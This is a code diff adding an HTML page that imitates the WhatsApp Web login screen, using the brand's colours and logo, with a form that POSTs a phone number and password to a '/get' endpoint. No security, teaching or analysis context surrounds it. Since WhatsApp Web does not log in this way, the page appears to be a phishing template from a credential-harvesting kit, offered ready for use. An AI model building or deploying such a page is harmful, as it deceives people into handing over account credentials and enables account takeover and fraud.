@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>WhatsApp Web</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+        background-color: #111b21;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 85%;
+        max-width: 400px;
+        padding: 30px 25px;
+        background-color: #202c33;
+        border-radius: 8px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 16px;
+      }
+      .g-h1 {
+        font-size: 20px;
+        font-weight: 400;
+        color: #e9edef;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        font-weight: 400;
+        color: #8696a0;
+        margin-bottom: 28px;
+        line-height: 1.5;
+      }
+      .phone-input {
+        display: flex;
+        gap: 8px;
+        margin-bottom: 12px;
+      }
+      .phone-input select {
+        width: 80px;
+        padding: 10px;
+        border: 1px solid #3b4a54;
+        border-radius: 8px;
+        background: #2a3942;
+        color: #e9edef;
+        font-size: 14px;
+        outline: none;
+      }
+      .phone-input input {
+        flex: 1;
+        padding: 10px;
+        border: 1px solid #3b4a54;
+        border-radius: 8px;
+        background: #2a3942;
+        color: #e9edef;
+        font-size: 14px;
+        outline: none;
+      }
+      .g-input {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #3b4a54;
+        border-radius: 8px;
+        background: #2a3942;
+        color: #e9edef;
+        font-size: 14px;
+        margin-bottom: 12px;
+        box-sizing: border-box;
+        outline: none;
+      }
+      .g-input:focus {
+        border-color: #00a884;
+      }
+      .g-input::placeholder {
+        color: #8696a0;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 12px;
+        background-color: #00a884;
+        color: #111b21;
+        border: none;
+        border-radius: 24px;
+        font-size: 16px;
+        font-weight: 500;
+        margin-top: 8px;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background-color: #06cf9c;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 12px;
+        color: #8696a0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 34 34" width="34" height="34">
+        <path fill="#00a884" d="M17 0C7.6 0 0 7.6 0 17c0 3 0.8 5.8 2.2 8.2L0 34l9-2.3c2.4 1.3 5.2 2 8 2 9.4 0 17-7.6 17-17S26.4 0 17 0z M17 31c-2.6 0-5.1-0.7-7.2-2l-0.5-0.3-5.3 1.4 1.4-5.2-0.3-0.5C4 22 3 19.2 3 16.4 3 8.7 9.3 3 17 3s14 5.7 14 13-6.3 15-14 15z"/>
+        <path fill="#fff" d="M25 19.5c-0.4-0.2-2.3-1.1-2.7-1.3-0.4-0.2-0.7-0.2-1 0.2s-1.2 1.3-1.5 1.5c-0.3 0.3-0.5 0.3-0.9 0.1s-1.7-0.6-3.2-2c-1.2-1.1-2-2.4-2.2-2.8s0-0.5 0.2-0.7c0.2-0.2 0.4-0.4 0.6-0.6 0.2-0.2 0.3-0.4 0.4-0.6 0.2-0.3 0.1-0.5 0-0.7s-1-2.4-1.4-3.3c-0.4-0.9-0.8-0.7-1-0.7h-0.9c-0.3 0-0.8 0.1-1.2 0.6s-1.5 1.5-1.5 3.6 1.5 4.1 1.7 4.4c0.2 0.3 3 4.6 7.3 6.4 2.5 1.1 3.5 1.2 4.8 1 0.4-0.1 1.2-0.5 1.4-1s0.2-0.9 0.1-1c-0.1-0.1-0.3-0.3-0.7-0.5z"/>
+      </svg>
+      <h1 class="g-h1">WhatsApp Web</h1>
+      <p class="g-h2">Scan the QR code on your phone or enter your number to connect</p>
+      <form action="/get" method="POST">
+        <div class="phone-input">
+          <select>
+            <option>+1</option>
+            <option>+44</option>
+            <option>+91</option>
+            <option>+880</option>
+          </select>
+          <input type="tel" name="phone" placeholder="Phone number" required>
+        </div>
+        <input class="g-input" type="password" name="password" placeholder="Password (optional)">
+        <button type="submit" class="gbtn-primary">Connect</button>
+      </form>
+      <p class="footer">By continuing, you agree to our Terms & Privacy Policy</p>
+    </div>
+  </body>
+</html>
